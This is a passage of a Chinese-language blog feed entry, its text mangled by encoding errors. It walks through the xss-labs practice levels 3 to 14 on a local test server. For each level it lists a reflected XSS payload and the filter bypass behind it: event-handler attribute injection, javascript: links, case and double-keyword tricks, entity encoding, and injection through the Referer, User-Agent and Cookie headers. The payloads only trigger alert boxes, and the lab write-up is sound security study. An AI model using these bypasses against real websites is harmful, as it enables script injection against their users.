class="string">&#x27;&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>valueæ˜¯é€šè¿‡å•å¼•å·æ¥é—­åˆçš„ï¼Œå› æ­¤å¯ä»¥æå‰é—­åˆvalueï¼Œä½†æ˜¯æ²¡æœ‰&lt;&gt;å°±æ— æ³•é—­åˆæ ‡ç­¾ï¼Œè€ƒè™‘ä½¿ç”¨è§¦å‘å™¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27;&#x27; onblur=&#x27;</span><span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p><code>?name=&#39; onblur=&#39;alert(1)</code></p><p>inputæ²¡æœ‰onerrorï¼Œè€Œonbluræ˜¯å¤±å»ç„¦ç‚¹è§¦å‘ï¼Œå› æ­¤æœç´¢æ¡†éšä¾¿è¾“ç‚¹ä¸œè¥¿ä¹‹åç‚¹å…¶ä»–åœ°æ–¹å°±æˆåŠŸè§¦å‘</p><p>æ³¨æ„ï¼šç©ºæ ¼</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; ()   script /script Script /Script scrscriptipt SCRscriptIPT Onerror onerror javascript: JavaScript: !-- -- eval() a img iframe form src &#123;&#125; / +&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°valueçš„åŒå¼•å·æœªè¢«è¿‡æ»¤ä¸”åŒå¼•å·é—­åˆï¼Œå› æ­¤ç±»ä¼¼level3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onblur=&quot;</span><span class="built_in">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;scrscriptipt&amp;gt; onerror onerror javascript: javascript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;scrscriptipt&gt; &lt;scrscriptipt&gt; o_nerror o_nerror javascript: javascript: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; src &#123;&#125; / +&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°&lt;&gt;å’Œjavascriptæœªè¢«è¿‡æ»¤ï¼Œä½†æ˜¯scriptå’Œonè¢«è½¬ä¹‰æˆscr_iptå’Œo_n</p><blockquote><p><a> æ ‡ç­¾æ˜¯ HTML ä¸­çš„é”šç‚¹å…ƒç´ ï¼Œä¸»è¦ç”¨äºåˆ›å»ºé“¾æ¥ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æ‰§è¡Œjs</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a href=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;hack&lt;/a&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>è¾“å…¥ <code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;hack&lt;/a&gt;&lt;&quot;</code>æˆåŠŸhack</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;Script&gt; &lt;/Script&gt; &lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt; Onerror o_nerror javascript: JavaScript: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; sr_c &#123;&#125; / +&quot;</span>&gt;    </span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a hr_ef=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;hack&lt;/a&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>hrefè¢«è½¬ä¹‰æ‰äº†ï¼Œä½†æ˜¯çœ‹ä¸Šé¢çš„å°è¯•ï¼Œä¼šå‘ç°å¤§å†™å¯ç”¨ï¼Œå°è¯•å¤§å†™hREFæˆåŠŸ</p><blockquote><p>HTMLå¤§å°å†™ä¸æ•æ„Ÿ</p></blockquote><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;scrscriptipt&amp;gt; onerror onerror javascript: javascript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;&gt; &lt;/&gt; &lt;&gt; &lt;/&gt; &lt;script&gt; &lt;script&gt; error error java: java: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt;  &#123;&#125; / +&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°scriptå’Œonéƒ½ä¼šè¢«è¿‡æ»¤æ‰ï¼Œä½†æ˜¯åªè¿‡æ»¤äº†ä¸€æ¬¡ï¼Œå› æ­¤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;scrscriptipt&gt;<span class="built_in">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><code>&quot;&gt;&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;&lt;&quot;</code></p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>å‘ç°è¾“å…¥çš„å€¼è¢«æ‹¼æ¥åˆ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">&quot;11&quot;</span>&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>hrefåï¼Œä½†æ˜¯JavaScriptè¢«è½¬ä¹‰äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">&quot;&#x27; &amp;quot () &lt; &gt; &lt;scr_ipt&gt; &lt;/scr_ipt&gt; &lt;scr_ipt&gt; &lt;/scr_ipt&gt; &lt;scrscr_iptipt&gt; &lt;scrscr_iptipt&gt; o_nerror o_nerror javascr_ipt: javascr_ipt: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; sr_c &#123;&#125; / +&quot;</span>&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¦ç”¨åˆ° href å±æ€§çš„ä¸€ä¸ªç‰¹æ€§ï¼šhref ä¼ å…¥çš„ URI ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ HTML å­—ç¬¦å®ä½“ã€‚åœ¨æ‰“å¼€é“¾æ¥æ—¶ï¼Œå­—ç¬¦å®ä½“ä¹Ÿä¼šè¢«è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="built_in">alert</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>ä¼šæ£€æµ‹http:&#x2F;&#x2F;</p><p>å› æ­¤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:<span class="built_in">alert</span>(<span class="number">1</span>);<span class="comment">//http://</span></span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/xss-levels/level10.php?keyword=test&amp;t_link=tlink&amp;t_history=thist&amp;t_sort=tsort</span></span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level10&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œtestç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;tsort&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å˜æˆè¿™æ ·ï¼Œå› æ­¤t_sortæ˜¯æœ‰å€¼çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&#x27; &quot;</span> ()   script /script Script /Script scrscriptipt SCRscriptIPT Onerror onerror javascript: JavaScript: !-- -- <span class="built_in">eval</span>() a img iframe form src &#123;&#125; /  <span class="string">&quot; type=&quot;</span>hidden<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>åªè¿‡æ»¤æ‰äº†&lt;&gt;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&quot;</span> onmouseover=javascript:<span class="built_in">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onmouseover=javascript:alert(1) type=&quot;</span></span><br></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>å‘ç°å­˜åœ¨refererå­—æ®µ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ref&quot;</span>  value=<span class="string">&quot;http://localhost/xss-levels/level10.php?keyword=&amp;t_sort=%22%20onmouseover=javascript:alert(1)%20type=%22&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>BPæŠ“åŒ…</p><p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250123115706229.png" alt="image-20250123115706229"></p><p>è®²Referreræ”¹ä¸ºâ€ onmouseover&#x3D;javascript:alert(1) type&#x3D;â€é€šè¿‡ï¼ŒæˆåŠŸ</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_ua&quot;</span>  value=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰uaæ®µï¼Œæ˜¾ç„¶æ˜¯ç”¨æˆ·ä¿¡æ¯ï¼Œå› æ­¤BPä¿®æ”¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ua&quot;</span>  value=<span class="string">&quot;&quot;</span> onmouseover=javascript:<span class="built_in">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;tsort&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_cook&quot;</span>  value=<span class="string">&quot;call me maybe?&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°t_sortå’Œt_cookå¯ä»¥é€šè¿‡GETSä¼ å‚ï¼Œä½†æ˜¯t_cookçš„åŸç†æœªçŸ¥</p><p>BPæŠ“åŒ…å‘ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=call+me+maybe%<span class="number">7F</span></span><br></pre></td></tr></table></figure><p>Cookieçš„userå­—æ®µä¾¿æ˜¯t_cookçš„æ¥æº</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>çœ‹æºç å‘ç°ç½‘ç«™è²Œä¼¼æ˜¯æŒ‚äº†çš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSSå­¦ä¹ &quot;&gt;&lt;a href=&quot;#XSSå­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;XSSå­¦ä¹ &quot;&gt;&lt;/a&gt;XSSå­¦ä¹ &lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰</summary>
      
    
    
    
    <category term="Webå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web" scheme="http://s1nec-1o.github.io/tags/Web/"/>
    
  </entry>
  
</feed>
